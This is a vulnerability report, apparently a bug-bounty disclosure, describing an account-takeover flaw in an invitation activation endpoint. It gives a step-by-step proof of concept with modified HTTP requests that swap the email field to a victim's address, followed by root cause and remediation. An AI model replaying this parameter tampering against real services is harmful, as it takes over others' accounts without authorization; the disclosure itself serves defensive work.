# Business Logic Flaw – Account Takeover via Invitation System

## Title

Business Logic Flaw in Invitation System Leads to Account Takeover

## Severity

Critical

## Vulnerability Type

Business Logic Vulnerability / Account Takeover

## Description

A business logic flaw exists in the user invitation workflow. When an invited user accepts an invitation, the application sends a request containing both the invitation token and the target email address.

The server fails to verify whether the email address supplied in the request matches the email address originally associated with the invitation token. As a result, an attacker can modify the email parameter and reset the password of another user account.

This allows unauthorized account takeover without requiring access to the victim's email inbox.

## Impact

An attacker can:

* Take over any user account within the application.
* Reset passwords of arbitrary users.
* Gain unauthorized access to sensitive company data.
* Escalate privileges if administrator accounts are targeted.

## Affected Endpoint

```http
POST /activate-invited-user
```

Invitation Link:

```text
https://app.redacted.com/reset-multi-user-password/<INVITE_TOKEN>
```

## Proof of Concept (PoC)

### Step 1: Invite a User

Navigate to the Users section and invite an email address under your control.

### Step 2: Open Invitation Link

Open the invitation email and click the invitation URL.

```text
https://app.redacted.com/reset-multi-user-password/<INVITE_TOKEN>
```

### Step 3: Intercept Request

While setting a password, intercept the request sent to:

```http
POST /activate-invited-user
```

Original Request:

```http
POST /activate-invited-user HTTP/1.1

{
  "email":"attacker@example.com",
  "password":"Password123!",
  "token":"INVITE_TOKEN"
}
```

### Step 4: Modify Email Parameter

Change the email field to a victim account.

Modified Request:

```http
POST /activate-invited-user HTTP/1.1

{
  "email":"owner@victim.com",
  "password":"NewPassword123!",
  "token":"INVITE_TOKEN"
}
```

### Step 5: Forward Request

Send the modified request to the server.

### Step 6: Login as Victim

Login using:

```text
Email: owner@victim.com
Password: NewPassword123!
```

The victim account is successfully compromised.

## Root Cause

The application validates only the invitation token and does not verify that:

* The email in the request matches the invited email.
* The invitation token is bound to a specific user account.
* The password reset operation is restricted to the invited recipient.

## Remediation

1. Bind invitation tokens to a specific email address.
2. Ignore client-supplied email parameters during invitation activation.
3. Validate the invited email on the server side.
4. Expire invitation tokens after use.
5. Log and monitor invitation acceptance events.
6. Implement additional verification before password creation.

## CWE Mapping

**CWE-840:** Business Logic Errors

## References

* OWASP Business Logic Vulnerabilities
* OWASP Top 10 – Broken Access Control
* CWE-840 Business Logic Errors

## Conclusion

Improper validation of invitation tokens allows an attacker to reset passwords for arbitrary users and achieve full account takeover. The vulnerability stems from trusting user-controlled parameters instead of binding invitation tokens to the intended recipient.
